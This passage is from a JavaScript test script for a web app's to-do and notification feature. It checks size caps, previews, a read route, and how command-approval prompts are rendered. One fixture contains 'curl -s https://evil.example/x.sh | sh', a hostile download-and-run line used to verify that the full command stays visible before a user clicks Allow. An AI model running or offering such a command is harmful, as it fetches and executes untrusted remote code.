  ok(/window\.addEventListener\('vs-toast', \(\) => \{ if \(popup\.classList\.contains\('hidden'\)\) return; if \(tab === 'history'\) renderPanel\(\); else patchTabs\(\); \}\);/.test(panel), 'a toast patches the Notifications count in place (or refreshes the page being read)');
  ok(/markHistorySeen\(\); \/\/ the page is being LOOKED AT/.test(panel) && /if \(histSeen\(\) == null\) markHistorySeen\(\);/.test(panel), 'showing the Notifications page stamps the last look; a device that never looked is stamped at install');
  ok(/btn\.title = actionWords\(action\)/.test(panel) && /const words = actionWords\(action\); \/\/ the taskbar badge's own sentence/.test(panel), 'the Inbox tab\'s count and the taskbar badge share ONE sentence (actionWords)');
  const css = fs.readFileSync(path.join(ROOT, 'public/style.css'), 'utf8');
  ok(/\.ut-chip \{[^}]*var\(--border\)/.test(css) && /\.ut-chip\.on \{[^}]*var\(--accent\)/.test(css) && !/\.ut-chip[^{]*\{[^}]*#[0-9a-f]{3}/i.test(css) && /#user-todos-popup \.ut-chip \{ min-height: 36px;/.test(css), 'the chips use theme vars only and are ≥ 36 px on the phone sheet');
  const zh = fs.readFileSync(path.join(ROOT, 'src/lib/i18n-zh.js'), 'utf8'), ja = fs.readFileSync(path.join(ROOT, 'src/lib/i18n-ja.js'), 'utf8');
  const KEYS = [...Object.values(O.ORIGIN_LABELS), 'All', 'Notices by source', 'Show all notices', 'Show only {source} notices', '{n} unread', 'Inbox', 'Notifications'];
  ok(KEYS.every((k) => zh.includes(`  ${JSON.stringify(k)}: `) && ja.includes(`  ${JSON.stringify(k)}: `)), 'every origin label and every new chrome string has a zh AND a ja entry', KEYS.filter((k) => !zh.includes(`  ${JSON.stringify(k)}: `) || !ja.includes(`  ${JSON.stringify(k)}: `)));
}

console.log('⑫ THE SIZE OF AN ITEM + THE PREVIEW SHAPE (2026-09-27, the For-you window\'s verify round) — the store\'s caps named on the return, the snapshot\'s preview, restoreDetails, the read route');
{
  const os = await import('node:os');
  const { createRequire } = await import('node:module');
  const { pathToFileURL } = await import('node:url');
  const { mutantCopies, copiesCensus } = await import('./mutant-copy.mjs');
  const require = createRequire(import.meta.url);
  const M = mutantCopies('ut-size', ROOT);
  const cleanup = [];
  process.on('exit', () => { for (const f of cleanup) { try { fs.rmSync(f, { recursive: true, force: true }); } catch { } } });
  const tmpdir = () => { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-ut-size-')); cleanup.push(d); return d; };
  // a patched copy OUTSIDE the tree (scripts/mutant-copy.mjs); every needle must exist
  const mutant = (rel, edits) => { let src = fs.readFileSync(path.join(ROOT, rel), 'utf8'); for (const [from, to] of edits) { if (!src.includes(from)) throw new Error(`control needle missing in ${rel}: ${from.slice(0, 70)}`); src = src.split(from).join(to); } return M.load(rel, src); };
  const UT = require(path.join(ROOT, 'src/user-todos.js'));
  const mk = (Mod = UT) => new Mod.UserTodoManager({ dataDir: tmpdir(), expirySweepMs: 0 });
  ok(UT.TEXT_MAX === 500 && UT.DETAIL_MAX === 8000 && UT.DETAIL_PREVIEW === 300, 'the constants: TEXT_MAX 500 · DETAIL_MAX 8000 · DETAIL_PREVIEW 300');
  // ── the caps, and the cut NAMED on the returned record (never in the ledger) ──
  const capLeg = (Mod) => {
    const m = mk(Mod);
    const long = m.add('claude:s', { origin: 'agent', text: 'long', detail: 'D'.repeat(9000) });
    const fit = m.add('claude:s', { origin: 'agent', text: 'fit', detail: 'E'.repeat(7999) });
    const q = m.add('claude:s', { origin: 'agent', text: 'Q'.repeat(600), detail: 'short' });
    const both = m.add('claude:s', { origin: 'agent', text: 'B'.repeat(501), detail: 'F'.repeat(8001) });
    const re = m.add('claude:s', { origin: 'agent', text: 'long', detail: 'G'.repeat(9000) }); // a re-file of `long` with another long detail
    const out = {
      long: { stored: m.get(long.id).detail.length, cut: long.detailCut, storedCut: m.get(long.id).detailCut, textCut: long.textCut },
      fit: { stored: m.get(fit.id).detail.length, cut: fit.detailCut }, q: { stored: m.get(q.id).text.length, cut: q.textCut, detailCut: q.detailCut },
      both: { textCut: both.textCut, detailCut: both.detailCut }, re: { existing: re.existing, cut: re.detailCut, stored: m.get(re.id).detail.length },
    };
    m.stop();
    return out;
  };
  const c = capLeg();
  ok(c.long.stored === 8000 && c.long.cut === 8000 && c.long.storedCut === undefined && c.long.textCut === undefined, 'a 9 000-char detail is kept to 8 000 and the RETURNED record says detailCut: 8000 — the ledger never carries the mark', c.long);
  ok(c.fit.stored === 7999 && c.fit.cut === undefined, 'a 7 999-char detail is whole, nothing named', c.fit);
  ok(c.q.stored === 500 && c.q.cut === 500 && c.q.detailCut === undefined, 'a 600-char question is kept to 500 and says textCut: 500', c.q);
  ok(c.both.textCut === 500 && c.both.detailCut === 8000, 'both caps hit ⇒ both named', c.both);
  ok(c.re.existing === true && c.re.cut === 8000 && c.re.stored === 8000, 'a re-file (existing: true) names the cut too', c.re);
  const cOld = capLeg(mutant('src/user-todos.js', [['const DETAIL_MAX = 8000;', 'const DETAIL_MAX = 2000;']]));
  ok(cOld.fit.stored === 2000 && cOld.fit.cut === 2000, 'CONTROL: a copy with the old 2 000 cap cuts the 7 999-char detail (the fit leg fails on it)', cOld.fit);
  const cSilent = capLeg(mutant('src/user-todos.js', [['    const cut = (o) => (textCut || detailCut ?', '    const cut = (o) => (false ?']]));
  ok(cSilent.long.stored === 8000 && cSilent.long.cut === undefined, 'CONTROL: a copy that never names the cut keeps 8 000 silently — the measured pre-fix behaviour (the naming leg fails on it)', cSilent.long);
  // ── the snapshot: an OPEN item whole, a RESOLVED one previewed; the ledger whole ──
  const shapeLeg = (Mod) => {
    const m = mk(Mod);
    const big = m.add('claude:s', { origin: 'agent', text: 'big', detail: 'H'.repeat(6000) + ' END' });
    const small = m.add('claude:s', { origin: 'agent', text: 'small', detail: 'tiny' });
    const none = m.add('claude:s', { origin: 'agent', text: 'none' });
    const openBig = m.snapshot().open.find((i) => i.id === big.id);
    m.setStatus(big.id, 'done'); m.setStatus(small.id, 'dismissed'); m.setStatus(none.id, 'done');
    const s2 = m.snapshot();
    const r = (id) => s2.resolved.find((i) => i.id === id);
    const out = {
      openWhole: openBig.detail.length === 6004 && openBig.detailTruncated === undefined,
      resolvedBig: { len: r(big.id).detail.length, flag: r(big.id).detailTruncated, head: r(big.id).detail.slice(0, 5), ledger: m.get(big.id).detail.length, ledgerFlag: m.get(big.id).detailTruncated },
      resolvedSmall: { detail: r(small.id).detail, flag: r(small.id).detailTruncated }, resolvedNone: { detail: r(none.id).detail, flag: r(none.id).detailTruncated },
    };
    m.stop();
    return out;
  };
  const sh = shapeLeg();
  ok(sh.openWhole, 'an OPEN item rides the snapshot WHOLE (6 004 chars, no flag)');
  ok(sh.resolvedBig.len === 300 && sh.resolvedBig.flag === true && sh.resolvedBig.head === 'HHHHH' && sh.resolvedBig.ledger === 6004 && sh.resolvedBig.ledgerFlag === undefined, 'a RESOLVED item rides as its first 300 chars + detailTruncated: true — the ledger keeps the 6 004 whole, unflagged', sh.resolvedBig);
  ok(sh.resolvedSmall.detail === 'tiny' && sh.resolvedSmall.flag === undefined && sh.resolvedNone.detail === null && sh.resolvedNone.flag === undefined, 'a short or absent detail is untouched (no flag)', { s: sh.resolvedSmall, n: sh.resolvedNone });
  const shCtl = shapeLeg(mutant('src/user-todos.js', [['    return { open, resolved: resolved.map(previewOf) };', '    return { open, resolved };']]));
  ok(shCtl.resolvedBig.len === 6004 && shCtl.resolvedBig.flag === undefined, 'CONTROL: a copy that broadcasts resolved items whole (the pre-fix shape) fails the preview leg', shCtl.resolvedBig);
  const pv = UT.previewOf;
  ok(pv({ id: 'a', detail: 'x'.repeat(301) }).detail.length === 300 && pv({ id: 'a', detail: 'x'.repeat(301) }).detailTruncated === true && pv({ id: 'a', detail: 'x'.repeat(300) }).detailTruncated === undefined && pv({ id: 'a', detail: null }).detail === null && pv(null) === null, 'previewOf (PURE): > 300 ⇒ 300 + the flag; ≤ 300 / null / garbage untouched');
  const orig = { id: 'z', detail: 'y'.repeat(400) }; pv(orig);
  ok(orig.detail.length === 400 && orig.detailTruncated === undefined, 'previewOf never mutates the record it is given');
  // ── restoreDetails (PURE, user-todos-layout.js): the whole detail this client saw survives a snapshot that previews it ──
  const { restoreDetails } = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
  const WHOLE = 'W'.repeat(1000) + ' END';
  const seen = restoreDetails({ open: [{ id: 'a', status: 'open', detail: WHOLE }], resolved: [] }, new Map());
  ok(seen.todos.open[0].detail === WHOLE && seen.fullById.get('a') === WHOLE, 'a whole detail the snapshot carried is remembered by id');
  const later = restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', detail: WHOLE.slice(0, 300), detailTruncated: true }] }, seen.fullById);
  ok(later.todos.resolved[0].detail === WHOLE && later.todos.resolved[0].detailTruncated === undefined && later.fullById.get('a') === WHOLE, 'the same item back as a preview ⇒ the whole text restored, the flag dropped (the reader\'s pane never shrinks under them)');
  const never = restoreDetails({ open: [], resolved: [{ id: 'b', status: 'done', detail: 'p'.repeat(300), detailTruncated: true }] }, seen.fullById);
  ok(never.todos.resolved[0].detailTruncated === true && never.todos.resolved[0].detail.length === 300, 'a previewed item this client never saw whole stays a preview (ensureDetail fetches it)');
  const changed = restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', detail: 'different head'.padEnd(300, '.'), detailTruncated: true }] }, seen.fullById);
  ok(changed.todos.resolved[0].detailTruncated === true, 'a preview that is NOT the head of the remembered text (the detail changed) is never overwritten');
  ok(!restoreDetails({ open: [], resolved: [] }, seen.fullById).fullById.has('a'), 'an id the snapshot no longer lists leaves the memory (no unbounded growth)');
  // "Clear content…" (2026-09-28): a CLEARED item (detail null, clearedAt) is never given back the whole text this client kept, and the memory forgets it
  const cleared = restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', text: "[cleared at the user's request]", detail: null, clearedAt: 5, clearedBy: 'owner' }] }, seen.fullById);
  ok(cleared.todos.resolved[0].detail === null && !cleared.fullById.has('a'), 'a CLEARED item keeps no detail even though this client held its whole text — and the client\'s memory drops that text (the clear reaches every copy)', cleared);
  ok(restoreDetails({ open: [], resolved: [{ id: 'c', status: 'done', detail: 'F'.repeat(300), detailTruncated: true }] }, new Map([['c', 'F'.repeat(500)]])).todos.resolved[0].detail.length === 500, 'a whole detail ensureDetail fetched (already in the map) applies the same way');
  const g = restoreDetails(null, null);
  ok(JSON.stringify(g.todos) === JSON.stringify({ open: [], resolved: [] }) && g.fullById.size === 0, 'garbage in ⇒ empty lists');
  {
    const src = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-layout.js'), 'utf8');
    const needle = '    if (!i || !i.detailTruncated) return i;';
    ok(src.includes(needle), 'control needle present in user-todos-layout.js');
    const noRestore = await import(pathToFileURL(M.write('src/lib/user-todos-layout.js', src.split(needle).join('    if (i) return i;'), 'no-restore')).href);
    const r = noRestore.restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', detail: WHOLE.slice(0, 300), detailTruncated: true }] }, seen.fullById);
    ok(r.todos.resolved[0].detailTruncated === true, 'CONTROL: a copy that never restores leaves the reader\'s item a preview (the restore leg fails on it)');
  }
  for (const row of copiesCensus(M.files, M.dir, ROOT, { minCopies: 4, label: '⑫ ' })) ok(row.pass, row.name, row.detail);
  // ── GET /api/user-todos/:id — ONE item whole, cookie-only ──
  {
    const { registerItemReadRoute } = require(path.join(ROOT, 'src/routes/user-todos-reply.js'));
    const routes = {}; const app = { get: (p, h) => { routes['GET ' + p] = h; }, post: (p, h) => { routes['POST ' + p] = h; } };
    const m = mk();
    registerItemReadRoute(app, { userTodos: m });
    const h = routes['GET /api/user-todos/:id'];
    const call = (id, headers = {}) => { let status = 200, json = null; h({ params: { id }, headers }, { status(c) { status = c; return this; }, json(j) { json = j; return this; } }); return { status, json }; };
    const big = m.add('claude:s', { origin: 'agent', text: 'big', detail: 'R'.repeat(5000) });
    m.setStatus(big.id, 'done');
    ok(typeof h === 'function', 'the route registers GET /api/user-todos/:id');
    const r1 = call(big.id);
    ok(r1.status === 200 && r1.json.item.id === big.id && r1.json.item.detail.length === 5000 && r1.json.item.detailTruncated === undefined && r1.json.item.status === 'done', 'a resolved item is served WHOLE (5 000 chars, no flag) whatever the snapshot carries', { status: r1.status, len: r1.json && r1.json.item && r1.json.item.detail.length });
    ok(call('ut-nope').status === 404 && call('ut-nope').json.code === 'not_found', 'an unknown id is 404 not_found');
    const a1 = call(big.id, { authorization: 'Bearer vsst_abc' }), a2 = call(big.id, { authorization: 'Bearer jbt_abc' });
    ok(a1.status === 403 && a1.json.code === 'agent_forbidden' && a2.status === 403, 'an agent / job token is refused by name (cookie-only — an agent reads its own items through vibespace-ask show)');
    m.stop();
  }
  // ── wiring pins ──
  const srv = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8'), acts = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-actions.js'), 'utf8'), cli = fs.readFileSync(path.join(ROOT, 'data/bin/vibespace-ask'), 'utf8');
  ok(/registerItemReadRoute\(app, \{ userTodos \}\)/.test(srv), 'server.js registers the read route');
  ok(/const r = restoreDetails\(next \|\| \{ open: \[\], resolved: \[\] \}, fullById\); todos = r\.todos; fullById = r\.fullById;/.test(acts) && /fetchJson\(`\/api\/user-todos\/\$\{encodeURIComponent\(id\)\}`\)/.test(acts) && /ensureDetail,/.test(acts), 'the client model restores every whole detail it saw on each snapshot and fetches a previewed one on demand (ensureDetail, exported)');
  ok(/if \(item\.detailCut\) console\.log\('NOTE: your --detail was CUT at ' \+ item\.detailCut/.test(cli) && /if \(item\.textCut\) console\.log\('NOTE: the question itself was CUT at ' \+ item\.textCut/.test(cli) && /up to 8000 chars/.test(cli), 'vibespace-ask names a cut detail / question by its cap and advertises 8000');
  ok(/up to 8000 chars of context/.test(fs.readFileSync(path.join(ROOT, 'docs/agent/ask-manual.md'), 'utf8')), 'the agent manual says 8000');
}

console.log('lane-pairing naive-user N-ask: an exit ask\'s Allow / Deny are their own line, never in the hover-dimmed action bar');
{
  // THE ROW RENDERER in node under a minimal DOM (renderRow only builds innerHTML); the patched copy through mutant-copy
  const noop = () => {};
  const mkEl = () => ({ dataset: {}, className: '', innerHTML: '', querySelector: () => null, querySelectorAll: () => [], appendChild: noop, addEventListener: noop, setAttribute: noop, classList: { add: noop, remove: noop, toggle: noop }, style: {} });
  const had = { window: globalThis.window, document: globalThis.document, localStorage: globalThis.localStorage, addEventListener: globalThis.addEventListener };
  globalThis.window = globalThis; globalThis.addEventListener = globalThis.addEventListener || noop; globalThis.removeEventListener = globalThis.removeEventListener || noop;
  globalThis.localStorage = { getItem: () => null, setItem: noop, removeItem: noop };
  globalThis.document = { createElement: mkEl, querySelector: () => null, querySelectorAll: () => [], getElementById: () => null, addEventListener: noop, removeEventListener: noop, documentElement: { style: {}, lang: 'en' }, body: mkEl(), head: mkEl() };
  try {
    const { pathToFileURL } = await import('node:url');
    const { mutantCopies } = await import(path.join(ROOT, 'scripts/mutant-copy.mjs'));
    const REL = 'src/lib/user-todos-row.js';
    const ctx = { t: (x, p) => (p ? x.replace(/\{(\w+)\}/g, (m, k) => (p[k] !== undefined ? String(p[k]) : m)) : x), wordsOf: (i) => i.text, detailOf: () => '', nameFor: () => 'S', replyState: () => ({ show: false }) };
    const ask = { item: { id: 'ut-x', text: 'Allow "ops" to run a command on Macbook?', action: { type: 'exit-run-ask', askId: 'k1', cmd: 'uname -a' }, createdAt: Date.now() } };
    const verdict = (html) => {
      const bar = (html.match(/<span class="ut-actions">[\s\S]*?<\/span>/) || [''])[0];
      const ans = html.indexOf('<div class="ut-exit-answer">'), cmd = html.search(/<(div|pre) class="ut-exit-cmd">/), note = html.indexOf('<div class="ut-exit-note">'); // verify-r4 F4: the command is a <pre>
      return { inBar: /ut-action-exit/.test(bar), ownLine: ans > cmd && cmd >= 0 && note > ans && /ut-exit-allow[\s\S]*ut-exit-deny/.test(html.slice(ans, note)) };
    };
    const R = await import(pathToFileURL(path.join(ROOT, REL)).href);
    const v = verdict(R.renderRow(ask, ctx).innerHTML);
    ok(!v.inBar && v.ownLine, 'N-ask: Allow / Deny are a line of their own under the command (never inside .ut-actions, 35 % until hover on the desktop; the phone\'s floated bar crushed the question)', v);
    const done = verdict(R.renderRow({ item: { ...ask.item, action: { type: 'exit-run-ask', cmd: 'uname -a' } } }, ctx).innerHTML);
    ok(!done.inBar && !done.ownLine, 'an exit item without an askId (nothing left to answer) draws no Allow / Deny', done);
    // CONTROL: the pre-fix renderer (the two buttons back in actionBtnHtml, the answer line gone)
    const src = fs.readFileSync(path.join(ROOT, REL), 'utf8');
    const pre = src.replace("  ? `<button class=\"ut-act ut-action-reset\" title=\"${escHtml(t('Use a reset credit…'))}\">${UI_ICONS.refresh || ''}</button>` : '');", "  ? `<button class=\"ut-act ut-action-reset\" title=\"${escHtml(t('Use a reset credit…'))}\">${UI_ICONS.refresh || ''}</button>` : i && i.action && i.action.type === 'exit-run-ask' && i.action.askId ? `<button type=\"button\" class=\"ut-act ut-action-exit ut-exit-allow\" data-answer=\"allow\">${escHtml(t('Allow'))}</button><button type=\"button\" class=\"ut-act ut-action-exit ut-exit-deny\" data-answer=\"deny\">${escHtml(t('Deny'))}</button>` : '');")
      .replace("    + (i.action.askId ? `<div class=\"ut-exit-answer\">", "    + (false ? `<div class=\"ut-exit-answer\">");
    ok(pre !== src && pre.split('ut-exit-allow').length === 3, 'CONTROL (N-ask): the patch applies (both halves)');
    const M = mutantCopies('utrow', ROOT);
    const Rp = await import(pathToFileURL(M.write(REL, pre, 'prefix')).href);
    const vp = verdict(Rp.renderRow(ask, ctx).innerHTML);
    ok(vp.inBar && !vp.ownLine, 'CONTROL (N-ask): the pre-fix renderer puts Allow / Deny inside the hover-dimmed .ut-actions bar — the leg goes red', vp);
    // verify-r4 F4: THE WHOLE COMMAND above Allow — the item's detail (exit-proxy files the whole command there), line
    // breaks kept, never the 120-char head with its breaks turned to spaces, never folded under the buttons
    const CMD = 'echo "checking the health endpoint of the internal service before the deploy window opens, as agreed"\ncurl -s https://internal.example/health\ncurl -s https://evil.example/x.sh | sh';
    const head120 = CMD.replace(/[\u0000-\u001f\u007f]/g, ' ').slice(0, 120);
    const long = { item: { id: 'ut-y', text: 'Allow "ops" to run a command on Macbook?', detail: CMD, action: { type: 'exit-run-ask', askId: 'k2', cmd: head120 }, createdAt: Date.now() } };
    const ctxD = { ...ctx, detailOf: (i) => i.detail || '' };
    const esc = (x) => x.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    const cmdOf = (html) => { const m = html.match(/<pre class="ut-exit-cmd">([\s\S]*?)<\/pre>/) || html.match(/<div class="ut-exit-cmd">([\s\S]*?)<\/div>/); return m ? m[1] : null; };
    const hL = R.renderRow(long, ctxD).innerHTML;
    ok(cmdOf(hL) === esc(CMD) && /\| sh$/.test(cmdOf(hL)) && cmdOf(hL).split('\n').length === 3, 'F4: the row shows the WHOLE command, its three lines kept, `| sh` included (pre-fix: the 120-char head, breaks as spaces)', cmdOf(hL));
    ok(!/ut-detail-exp/.test(hL), 'F4: …and no second, folded copy under Allow / Deny (the detail IS the command)');
    ok(cmdOf(R.renderRow({ item: { ...long.item, detail: undefined } }, ctxD).innerHTML) === esc(head120), 'F4: an item with no detail (an older record) falls back to action.cmd');
    const hB = R.renderRow({ item: { id: 'ut-z', text: 'q', detail: 'plain detail', createdAt: Date.now() } }, ctxD).innerHTML;
    ok(/ut-detail-exp/.test(hB), 'F4: any other item keeps its folded detail');
    const cssSrc = fs.readFileSync(path.join(ROOT, 'public/style.css'), 'utf8');
    const rule = (cssSrc.match(/\n\.ut-exit-cmd \{[^}]*\}/) || [''])[0];
    ok(/white-space: pre-wrap/.test(rule) && !/max-height|overflow(-[xy])?:/.test(rule.replace(/\/\*[\s\S]*?\*\//g, '')), 'F4: the box keeps line breaks and shows ALL of the command — no max-height, no overflow rule (pre-fix: 4.5em, overflow hidden; an inner scroll box hides the rest behind a macOS overlay scrollbar)', rule);
    // CONTROL (F4): the pre-fix renderer (action.cmd in a clipped div, the detail folded below)
    const preF4 = src.replace("  ? `<pre class=\"ut-exit-cmd\">${escHtml(exitCmdOf(i))}</pre>`", "  ? `<div class=\"ut-exit-cmd\">${escHtml(String(i.action.cmd || ''))}</div>`").replace("const detailHtml = detail && !(i.action && i.action.type === 'exit-run-ask') ?", 'const detailHtml = detail ?');
    ok(preF4 !== src && preF4.split('String(i.action.cmd || \'\')').length === 2, 'CONTROL (F4): the patch applies (both halves)');
    const Rf4 = await import(pathToFileURL(M.write(REL, preF4, 'prefixf4')).href);
    const hP = Rf4.renderRow(long, ctxD).innerHTML;
    ok(cmdOf(hP) === esc(head120) && !/\| sh/.test(cmdOf(hP)) && /ut-detail-exp/.test(hP), 'CONTROL (F4): the pre-fix row shows "…as agreed\" curl -s https://in" — `| sh` nowhere above Allow — the F4 leg goes red', cmdOf(hP));
  } catch (e) { ok(false, 'N-ask: the row renderer runs under the minimal DOM', e.stack); }
  finally { for (const [k, v] of Object.entries(had)) { if (v === undefined) delete globalThis[k]; else globalThis[k] = v; } }
}

console.log(fail ? `\n${fail} FAILED (${pass} passed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
